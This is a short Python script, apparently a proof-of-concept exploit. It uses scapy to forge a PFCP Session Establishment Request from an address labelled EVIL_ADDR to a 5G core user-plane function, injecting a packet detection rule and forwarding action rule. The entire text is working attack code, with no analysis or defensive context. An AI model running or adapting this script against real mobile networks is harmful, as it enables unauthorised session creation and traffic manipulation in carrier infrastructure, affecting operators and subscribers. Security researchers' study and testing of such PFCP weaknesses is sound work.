from scapy.all import send, IP, UDP
from scapy.contrib.pfcp import *

EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"

seid = 0x0000000000C0FFEE
seq = 1

node_id = IE_NodeId(id_type=0, ipv4=EVIL_ADDR)
cp_f_seid = IE_FSEID(seid=seid, v4=1, ipv4=EVIL_ADDR)

create_far = IE_CreateFAR(
    far_id=1,
    apply_action=IE_ApplyAction(FORW=1),
    forward_parameters=IE_ForwardingParameters(destination_interface=1)
)

create_pdr = IE_CreatePDR(
    pdr_id=1,
    precedence=255,
    pdi=IE_PDI(
        source_interface=1,
        local_f_teid=IE_FTEID(teid=0x11111111, ipv4=UPF_ADDR)
    ),
    far_id=1
)

pfcp_msg = PFCP(
    version=1,
    message_type=50,
    seid=0,
    seq=seq
)/node_id/cp_f_seid/create_pdr/create_far

packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg

send(packet)
print(f"Packet sent")
